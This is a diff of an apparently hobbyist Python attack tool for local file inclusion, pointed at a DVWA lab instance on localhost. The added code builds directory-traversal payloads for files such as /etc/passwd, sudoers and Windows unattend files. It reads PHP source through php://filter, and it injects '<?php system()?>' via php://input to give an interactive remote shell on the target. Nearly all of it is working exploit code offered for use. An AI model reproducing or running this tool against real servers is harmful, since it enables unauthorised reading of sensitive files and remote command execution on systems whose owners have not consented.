@@ -4,82 +4,349 @@ import sys
 import time
 import requests
 import urllib.parse as urlparse
-import re
-import webbrowser
+import base64
+from termcolor import colored
 
-session = requests.Session()
+    # def sanitation_bypass_url_encode(self):
+        # """URL encoded the payload"""
+        # original = self.payload
+        # self.payload = urllib.parse.quote_plus(self.payload)
 
-# PAYLOAD
-# def generate_payloads(url, payload_list, os):
-    # if find_injection_points(url):
-        # directory_transversal(payload_list, os)
+        # if self.payload == original or self.filter:
+            # return False
+        # else:
+            # self.url_encode = True
+            # self.url_dbl_encode = False
+            # return True
+	
+	# def directory_traversal(self, n):
+        # """Creates a directory traversal attack"""
+        # traversal = "../"
+        # n += 1
+        # if self.directories_transversed == 0:
+            # self.payload = (n * traversal) + ".." + self.payload
+        # else:
+            # self.payload = (n * traversal) + self.payload
+        # self.directories_transversed = n
 
-def find_injection_points(url, parameters, key):
-    """
-    Finds the payload injection points in the URL
-    """
-    try:
+def checkIfWindows(path, victimOs):
+    if(victimOs == "Windows" or (len(path) > 0 and "\windows\system32" in path.lower())): 
+        print (colored("\n[+] OS: Windows\n","white"))
+        return True
+    return False
 
-        for parameter in parameters:
-            name = parameter.split("=")[0]
-            #value = parameter.split("=")[1]
-            #key.append(name)
-            key.append(name)
-            return key
+def isUnknown(par):
+    if(len(par) < 2 or len(par) > 120):
+        return "?"
+    return par
 
-    except IndexError:
-        return -1
+def cleanOutput(output, newline):
+    output = output.replace("\r","").replace("%c" %chr(0), "").replace("\t","") # chr(0)=NUL
+    if(newline):
+        output = output.replace("\n","")
+	
+    return output
 
-def location(os):
-    """
-	Linux File Locations 
-	or 
-	Windows File Locations 
-	or 
-	OS X/macOS File Locations
-	"""
-    if os == 'linux':
-        test_file = ['etc/passwd']
-        #test_file = ['etc/passwd',  'etc/shadow',  'etc/issue',  'proc/version',  'etc/profile', 'root/.bash_history', 'var/log/dmessage', 'var/mail/root', 'var/spool/cron/crontabs/root']
-    elif os == 'windows':
-        test_file = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
-    else: #OS X/macOS
-        test_file = ['etc/fstab', 'etc/master.passwd', 'etc/resolv.conf', 'etc/sudoers', 'etc/sysctl.conf']
-    return test_file
+def checkHttp(url):
+    if("http://" not in url and "https://" not in url):
+        return "http://%s" %url
+    return url
 
-def directory_transversal(payload_list, os):
-    """
-    Gets the parameter and adds the ../../.. ...
-    """
-    test_file = location(os)
+def getDomainFromUrl(url):
 
-    for x in range(0, len(test_file)):
-        for y in range(0, 7):
-            if y == 0:
-                temp = ('/' + test_file[x])
-                payload_list.append(temp)
+    splits = url.split('/')
+    if("http://" in url or "https://" in url):
+        return "%s" % splits[2] # http://127.0.0.1/dvwa/index.php --> 127.0.0.1
+    return "%s" % splits[0] # 127.0.0.1/dvwa/index.php --> 127.0.0.1
+
+def cutURLToLastEqual(url):
+    indexes = SubstrIndexes(url,"=")
+    return url[0:indexes[len(indexes)-1]+1]
+
+def SubstrIndexes(resp, toFind):
+    if(len(toFind) > len(resp)):
+        return []
+
+    found = False
+    indexes = []
+
+    for x in range(0,(len(resp)-len(toFind))+1):
+        if(ord(resp[x]) == ord(toFind[0])):
+            found = True
+            for i in range(0,len(toFind)):
+                if(ord(resp[x+i]) != ord(toFind[i])):
+                    found = False
+                    break
+        if(found):
+            indexes.append(x)
+            found = False
+            x += len(toFind)
+
+    return indexes
+
+# SCANNER
+class Scanner:
+    """Sends payload via a GET request for scanning"""
+    def __init__(self, url, key, payload_list, null_byte, gen_headers, parameters, os):
+        """Initializes variable for scanning"""
+        self.url = url
+        self.key = key
+        self.payload_list = payload_list
+        self.null_byte = null_byte
+        self.gen_headers = gen_headers
+        self.parameters = parameters
+        self.key = key
+        self.os = os
+
+    def find_injection_points(self):
+        """
+        Finds the payload injection points in the URL
+        """
+        try:
+
+            for parameter in self.parameters:
+                name = parameter.split("=")[0]
+                #value = parameter.split("=")[1]
+                #key.append(name)
+                self.key.append(name)
+                return 1
+
+        except IndexError:
+            return -1
+
+    def location(self):
+        """
+	    Linux File Locations 
+	    or 
+	    Windows File Locations 
+	    or 
+        OS X/macOS File Locations
+	    """
+        if self.os == 'linux':
+            test_file = ['etc/passwd']
+            #test_file = ['etc/passwd',  'etc/shadow',  'etc/issue',  'proc/version',  'etc/profile', 'root/.bash_history', 'var/log/dmessage', 'var/mail/root', 'var/spool/cron/crontabs/root']
+        elif self.os == 'windows':
+            test_file = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
+        else: #OS X/macOS
+            test_file = ['etc/fstab', 'etc/master.passwd', 'etc/resolv.conf', 'etc/sudoers', 'etc/sysctl.conf']
+        return test_file
+
+    def directory_transversal(self):
+        """
+        Gets the parameter and adds the ../../.. ...
+        """
+        test_file = self.location()
+
+        for x in range(0, len(test_file)):
+            for y in range(0, 7):
+                if y == 0:
+                    temp = ('/' + test_file[x])
+                    self.payload_list.append(temp)
+                else:
+                    temp = ((y * '../') + test_file[x])
+                    self.payload_list.append(temp)
+        return self.payload_list
+
+    def generic_null_byte(self):
+        """Just addes %00 to the end of the payload"""
+        temp = []
+        for payload in self.payload_list:
+            temp.append(payload + "%00")
+            print(temp)
+        return temp
+
+    def generate_payloads(self):
+        if self.find_injection_points():
+            print("Generating Payloads")
+            self.directory_transversal()
+            if self.null_byte == True:
+                self.payload_list = self.generic_null_byte()
+
+    def scan(self):
+        url_not_para = self.url.split('?')[0]
+        para = {}
+
+        for i in range(0, len(self.payload_list)):
+            para[self.key[0]] = self.payload_list[i]
+            r = requests.get(url_not_para, params = para, headers=self.gen_headers)
+
+#---------------------------------------------------------------------------------
+
+
+class Exploiters:
+    """PHP filter"""
+    def __init__(self, url, gen_headers, ):
+        """Initializes variables for getting payloads via PHP Filter"""
+        self.url = url
+        self.gen_headers = gen_headers
+
+    #-----------------------------------------------------------------------------#
+    # PHP FILTER
+    def base64_check(self, char):
+        temp = ord(char)
+        if((temp >= 65 and temp <= 90) or (temp >= 97 and temp <= 122) or (temp >= 48 and temp <= 57) or (temp == 43) or (temp == 47) or (temp == 61)):
+    	    return True;
+        return False;
+
+    def extract_phpfilter(self, content):
+        ftemp = ""
+        found = []
+
+        lines = content.split('\n')
+        for line in lines:
+            ftemp = ""
+            length = len(line)
+
+            for x in range(0,length):
+                if(self.base64_check(line[x])):
+                    ftemp += line[x]
+                else:
+                    if(length > 100 and self.base64_check(line[x]) is False and len(ftemp) >= (length/2)):
+                        break
+                    ftemp = ""
+
+            if(len(ftemp) > 0):
+                found.append(ftemp)
+
+        final = ""
+        if(len(found) > 0):
+            max = 0
+            index = -1
+            for x in range(0,len(found)):
+                length = len(found[x])
+                if(length > max):
+                    max = length
+                    index = x
+            final = found[index]
+
+        return final
+
+    def run_phpfilter(self):
+
+        url_not_val = self.url.split('=')[0]
+        filterpage = "1"
+        while(True):
+            filterpage = input("[*] Enter the page you want to steal information of ['0' to exit] -> ")
+            if(filterpage == "0"):
+                break
+            filterurl = "%s=php://filter/convert.base64-encode/resource=%s" %(url_not_val, filterpage)
+
+            r = requests.get(filterurl, headers=self.gen_headers, timeout=15, verify=False)
+            filtercontent = r.text
+
+            found = self.extract_phpfilter(filtercontent)
+
+            if(len(found) == 0):
+                print( "[-] Any interesting Base64 code found :(")
             else:
-                temp = ((y * '../') + test_file[x])
-                payload_list.append(temp)
-    return payload_list
+                see = input("[+] Found possible interesting Base64 code. Do you want me to show it? (y/n) ")
+                if(see == "y" or see == "Y" or see == "yes"):
+                    print ("-------------------------------------------------------------------------------------------------------------------------")
+                    print ("%s" %found)
+                    print ("-------------------------------------------------------------------------------------------------------------------------\n")
 
-def generic_null_byte(payload_list):
-    """Just addes %00 to the end of the payload"""
-    temp = []
-    for payload in payload_list:
-        temp.append(payload + "%00")
-    return temp
+                decode = input("[*] Do you want me to decode it? (y/n) ")
+                if(decode == "y" or decode == "Y" or decode == "yes"):
+                    decoded = base64.b64decode(found)
+                    print ("\n\n--Decoded text-----------------------------------------------------------------------------------------------------------\n")
+                    print ("%s" %decoded)
+                    print ("\n-------------------------------------------------------------------------------------------------------------------------\n")
 
-def php_filter():
-    pass
+            print ("")
+
+
+    #-----------------------------------------------------------------------------#
+    #PHP INPUT
+
+    def send_phpinput_cmd(self, cmd, inputurl):
+
+        if(self.url[-11:] == "php://input"):
+            inputurl = inputurl[:-11]
+
+        inputurl = "%sphp://input" %(inputurl)
+        phpcmd = cmd[:6] == "php://"
+        body = ""
+
+        if(phpcmd):
+            cmd = cmd[6:]
+            length = 25+len(cmd)
+            body = "RHVuZ0h1eQ ** <?php %s?> **" %cmd
+        else:
+            length = 36+len(cmd)
+            body = "RHVuZ0h1eQ ** <?php system('%s');?> **" %cmd
+	
+        self.gen_headers['Content-Length'] = '%s' %length
+        r = requests.post(url=inputurl, headers=self.gen_headers, data=body)
+
+        return r.text
+
+    def extract_phpinput_resq(self, resp):
+        strs = SubstrIndexes(resp,"RHVuZ0h1eQ **")
+
+        try:
+            point = strs[0]+14
+        except:
+            return ""
+
+        getOutput = ""
+        while(point < len(resp)-1 and (resp[point] != '*' or resp[point+1] != '*')):
+            getOutput += resp[point]
+            point += 1
+
+        return getOutput[:-1]
+
+    def run_phpinput(self, os):
+
+        inputurl = checkHttp(self.url)
+        inputurl = cutURLToLastEqual(inputurl)
+        resp = self.send_phpinput_cmd("echo Pentest", inputurl)
+        getIndexes = SubstrIndexes(resp,"RHVuZ0h1eQ **")
+        phpcmd = False
+
+        if(len(getIndexes) == 0):
+            return
+        if("system() has been disabled for security reasons in" in resp):
+            phpcmd = True
+
+        print ("\n[+] The website seems to be vulnerable. Opening a Shell..")
+
+        if(phpcmd is False):
+            _id = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("id",inputurl)), True)
+            if(len(_id) == 0):
+                path = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("path",inputurl)), True)
+                if(checkIfWindows(path, os)):
+                    os = "windows"
+
+            print (colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
+            whoami = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("whoami",inputurl)), True))
+            if(os != "Windows"):
+                pwd = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("pwd",inputurl)), True)
+            else:
+                pwd = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("cd",inputurl)), True)
+        else:
+            print (colored("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
+            whoami = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://get_current_user();",inputurl)), True))
+            pwd = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://getcwd();",inputurl)), True))
+
+        time.sleep(1)
+        domain = getDomainFromUrl(inputurl)
+        cmd = ""
+        while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
+            if(phpcmd):
+                cmd = input("%s@%s:%s$ PHP:// " %(whoami,domain,pwd))
+                if(cmd[:6] != "php://"):
+                    cmd = "php://%s" %cmd
+            else:
+                cmd = input("%s@%s:%s$ " %(whoami,domain,pwd))
+            if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
+                print (cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd(cmd,inputurl)), False))
+        exit()
+#-------------------------------------------------------------------------
 
 def php_zip():
     pass
 
 def php_expect():
-    pass
-
-def php_input():
     pass
 
 def php_phar():
@@ -88,86 +355,44 @@ def php_phar():
 def php_fill():
     pass
 
+
 # REQUEST
 class TestConnect:
     """Class used for testing requests"""
-    def __init__(self, url):
+    def __init__(self, url, gen_headers):
         self.url = url
-        pass
+        self.gen_headers = gen_headers
 
-    def urlparse(self, url):
+    def urlparse(self):
         """
         Parse the URL to the GET parameters
         """
-        return urlparse.urlparse(url)
+        return urlparse.urlparse(self.url)
 
 
-    def target(self, url):
+    def target(self):
         """
         Is the target valid?
         """
         try:
-            r = requests.head(url)
+            r = requests.head(self.url, headers = self.gen_headers)
         except requests.ConnectionError:
-            print("Connection Error: \t" + url)
+            print("Connection Error: \t" + self.url)
             return -1
         except requests.exceptions.MissingSchema:
-            print("Invalid URL:\t" + url)
+            print("Invalid URL:\t" + self.url)
             return -1
 
         print("Status code " + str(r.status_code))
         if r.status_code == 200:
-            print(url + "\treturned " + str(200))
+            print(self.url + "\treturned " + str(200))
             return 1
-
-class Get:
-    """Sends payload via a GET request"""
-    def __init__(self, url, key, payload_list, null_byte):
-        self.url = url
-        self.key = key
-        self.payload_list = payload_list
-        self.null_byte = null_byte
-
-    def request_response(self):
-        para = {}
-        temp_payload = []
-        if self.null_byte == True:
-            temp_payload = generic_null_byte(self.payload_list)
-        else:
-            temp_payload = self.payload_list
-
-        for i in range(0, len(temp_payload)):
-            para[self.key[0]] = temp_payload[i]
-            r = requests.get(self.url, params = para)
-            if r.status_code == 200:
-                webbrowser.open(self.url + '?' + self.key[0] + '=' + temp_payload[i])
-
-class Post:
-    """Sends payload via a POST request"""
-    def __init__(self):
-        pass
-
-class Cookies:
-    """Sends payload via cookie"""
-    def __init__(self):
-        pass
-
-class Crawler:
-    """Class used for crawlers"""
-    def __init__(self):
-        pass
+        return 1
 
 
 def main():
-    # global session
-    # url = 'http://localhost:8080/dvwa/'
-    # r = session.get(url)
-    # user_token = re.findall("value='(.*)'", r.text)[0]
-    # url = 'http://localhost:8080/dvwa/login.php'
-    # r = session.post(url, data={'username':'admin', 'password':'password', 'user_token':user_token, 'Login':'Login'})
-    # session.cookies.set('security', 'low', path='/dvwa', domain='localhost:8080')
 
-    url = 'http://localhost:8080/dvwa/vulnerabilities/fi/?page=include.php'
+    url = 'http://localhost:8080/dvwa/vulnerabilities/fi/?page=file1.php'
     php = True
     os = 'linux'
     key = []
@@ -175,11 +400,21 @@ def main():
     payload_list = [] #[../../../../../]/etc/passwd
     parameters = []
     null_byte = False #%00
-    test = TestConnect(url)
+    gen_headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20110201 Firefox/67.0',
+                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                   'Accept-Language':'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
+                   'Accept-Encoding': 'gzip, deflate',
+                   'Connection':'keep-alive'}
 
-    if test.target(url) != -1:
+    input_cookie = input("\n[*] Enter cookies if needed (ex: 'PHPSESSID=12345;par=something') [just enter if none] -> ")
+    if len(input_cookie) > 0:
+        gen_headers['Cookie'] = input_cookie
+    #gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"
+    test = TestConnect(url, gen_headers)
 
-        url_parameters = test.urlparse(url)
+    if test.target() == 1:
+
+        url_parameters = test.urlparse()
         print("Scheme:\t" + str(url_parameters.scheme))
         print("Netloc:\t" + str(url_parameters.netloc))
         print("Path:\t" + str(url_parameters.path))
@@ -195,19 +430,20 @@ def main():
                     parameters.append(temp[x])
                     print("GET parameter " + str(x + 1) + ": \t" + temp[x])
 
-                is_injection_point = find_injection_points(url, parameters, key)
-                if is_injection_point != -1:
-                    key = is_injection_point
-                    payload_list = directory_transversal(payload_list, os)
-
+				# Scanner
+                scanner_payloads = Scanner(url, key, payload_list, null_byte, gen_headers, parameters, os)
+                scanner_payloads.generate_payloads()
+                scanner_payloads.scan()
+                # PHP Filter
+                exploiters_payloads = Exploiters(url, gen_headers)
+                #exploiters_payloads.run_phpfilter()
+                # PHP Input
+                exploiters_payloads.run_phpinput(os)
         else:
             print("No GET parameters")
     else:
         print("Failed connection: " + url)
-    url_not_para = url.split('?')[0]
-	
-    get_payloads = Get(url_not_para, key, payload_list, null_byte)
-    get_payloads.request_response()
+
 
 if __name__== "__main__":
     main()
